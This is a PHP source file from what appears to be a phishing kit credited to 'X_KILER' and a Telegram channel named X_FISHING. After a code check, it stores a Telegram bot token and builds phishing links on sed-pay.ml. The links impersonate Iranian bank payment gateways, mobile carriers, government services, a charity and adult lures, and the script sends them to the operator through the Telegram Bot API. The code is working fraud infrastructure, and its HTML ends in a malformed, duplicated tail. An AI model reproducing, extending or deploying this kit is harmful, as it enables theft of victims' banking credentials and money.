<?php

//CODED BY X_KILER 

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}
//CODED BY X_KILER 
header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}
//GET for Information

 $cheack = file_get_contents("CoDe.txt");
 if(strstr($cheack,'../')){
die('lfi and rfi detected');
}
$T = file_get_contents("ToKenm.txt");
if(strstr($T,'../')){
die('lfi and rfi detected');
}


$I = file_get_contents("IDm.txt");
if(strstr($I,'../')){
die('lfi and rfi detected');
}


//END GET for Information
if ($_POST["code"]==$cheack){ $show="درگاه های شما ساخته شد و لینک هابه ربات شما ارسال شد! ";
$font="00FF00";

$IP=$_SERVER["REMOTE_ADDR"];
//URL LINKS

$url="sed-pay.ml/U";

//END URL LINKS

//CREATED PAYMENT

$O=rand(1,999);
if(!file_exists("User")){mkdir("User");}
$xkiler = fopen("User/$O.php", 'w') or die("x kiler !");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $I;\n");
fwrite($xkiler, "?>");

$Parsian="$url/Parsian/?e=$O" ;
$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Saman="$url/Saman/?e=$O";
//Text Messsage of bot

$TE="
╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️ Name :  Asan (آسان پرداخت) 
║ $Asan
╠═══════════════╣⫸
╟ ✳️ Name : Mellat (به پرداخت)
║ $Mellat
╠═══════════════╣⫸
╟ ✳️ Name : Parsian (پارسیان)
║ $Parsian
╠═══════════════╣⫸
╟ ✳️ Name : Parsian (سامان)
║ $Saman
╠═══════════════╣⫸
╟ ✳️ Name :Charge(شارژ جدید)
║ $Charge
╠═══════════════╣⫸
╟ ✳️ Name : Net ( نت )
║ $net6
╠═══════════════╣⫸
╟ ✳️ Name : Vam (وام یک ملیونی)
║ $Vam
╠═══════════════╣⫸
╟ ✳️ Name : Mci (ام سی ای)
║ $Mci
╠═══════════════╣⫸
╟ ✳️ Name : Sex Chat(سکس چت)
║ $Chat
╠═══════════════╣⫸
╟ ✳️ Name : Live sexi (لایو سکسی)
║ $Live
╠═══════════════╣⫸
╟ ✳️ Name : Sighe (صیغه)
║ $Sighe
╠═══════════════╣⫸
╟ ✳️ Name : Iranccel (نت ایرانسل)
║ $Irancell
╠═══════════════╣⫸
╟ ✳️ Name : Netnew (نت جدید ) 
║ $Internet
╠═══════════════╣⫸
╟ ✳️ Name : Mobo (موبوشارژ) 
║ $Mobo
╠═══════════════╣⫸
╟ ✳️ Name : Help (کمک به بیماران) 
║ $Kheyrieh
╠═══════════════╣⫸
╟ ✳️ Name : Hamta (سامانه همتا) 
║ $Hamta
╠═══════════════╣⫸
╟ ✳️ Name : Netmeli (اینترنت ملی) 
║ $Internetmeli
╠═══════════════╣⫸
╟ ✳️ Name : Saham (سهام عدالت) 
║ $Saham
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید فالور) 
║ $Folower
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید اشتراک فیلمو) 
║ $Filimo
╠═══════════════╣⫸
╟ ✳️ Name : Insta (فیک پیچ ) 
║ $Freefolower
╠═══════════════╣⫸
╟ ✳️ Name : Masaj (رزو ماساژور)
║ $Masaj
╠[𝚈𝚘𝚞𝚛 𝙸𝙿]╣⫸
╟ 🌐𝙸𝙿 <code>$IP</code>
║
╠[𝚈𝚘𝚞𝚛 𝚒𝚍]╣⫸
╟ 🆔 <code>$I</code>
║
╠═══[𝙻𝚒𝚗𝚔]══╣⫸
╟ ♻️ WEB LINK
║ https://$url?Start
╠══[𝙿𝚘𝚛𝚝]═══╣⫸
╟ 🔢YOR  CODE <code>$O</code>
║ 
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @X_KILER
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═══════╣⫸
╟ 🆔 @X_FISHING
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
";
  
file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$I."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($TE));


$btn="خانه";
$php="Kiler";

unlink('IDm.txt');
unlink('ToKenm.txt');
unlink('CoDe.txt');
}
//END CREATED PAYMENT


//SHOW EROR 
else{
$show="کد ارسال شده به ربات نادرست بود دوباره امتحان کنید! ";
$font="FF0000";
$btn="امتحان مجدد" ;
$php="kiler";

unlink('IDm.txt');
unlink('ToKenm.txt');
unlink('CoDe.txt');

} 
//THE END 


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <head>   <meta content="درگاه ساز کیلر" name="description">
    <meta content="درگاه ساز کیلر" name="keywords">
     <meta content="درگاه ساز کیلر" name="Abstract">
      <meta name="title" content="درگاه ساز کیلر">
       <meta name="description" content="درگاه ساز کیلر ">
       <meta name="keywords" content="کیلر">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>درگاه ساز کیلر</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/fontawesome-all.min.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-style.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-theme19.css">
</head>
<body>
    <div class="form-body without-side">
        <div class="website-logo">
            <a href="index.html">
                <div class="logo">
                    <img class="logo-size" src="images/logo-light.png" alt="">
                </div>
            </a>
        </div>
        <div class="row">
            <div class="img-holder">
                <div class="bg"></div>
                <div class="info-holder">
                    <img src="" alt="">
                </div>
            </div>
            <div class="form-holder">
                <div class="form-content">
                    <div class="form-items">
                    	
 
                      
                                                <h3>درگاه ساز کیلر</h3>
                        <p><font color="#<?php echo $font;?>"><?php echo $show;?></font></p>
                              <form method="POST" action="<?php echo $php?>.php" onSubmit="return javidh();">        <div class="form-button">
                                <button id="submit" type="submit" class="ibtn"><?php echo $btn?></button>
<a href="https://t.me/x_fishing"> <font color="#4B0082">CHANNEL</font></a>
</div>
</from>
<div class="other-links">

                    <a href="https://t.me/x_kiler"><font color="#00ffff">CODED BY XKILER </font></a>
              </div>
                   

                    </div>
                    </div>
                
            </div>
        </div>
    </div>
<script src="js/jquery.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>
</body>
   <html>  
        <head>
            <style>img[alt="www.000webhost.com"]{display:none;}</style>
          <meta charset="utf-8">
          
          <meta http-equiv="X-UA-Compatible" content="IE=edge">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style type="text/css">
</body>


</html>

